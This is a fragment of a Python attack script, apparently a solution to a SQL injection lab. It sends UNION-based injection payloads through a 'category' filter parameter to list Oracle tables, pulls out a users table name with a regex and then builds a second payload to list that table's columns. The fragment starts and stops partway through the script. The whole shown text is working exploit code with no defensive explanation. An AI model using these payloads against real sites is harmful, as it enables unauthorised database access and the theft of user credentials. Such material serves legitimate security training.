...
if __name__ == "__main__":
    ...
    r = session.get(base_url + "/filter?category=' UNION SELECT table_name,NULL FROM all_tables--", headers=burp_headers)
    response_text = r.text

    pattern_user = r'USERS_[A-Z]{6}'
    username_table = re.search(pattern_user, response_text).group(0)

    burp_url2 = base_url + f"/filter?category='+UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='{username_table}'--"
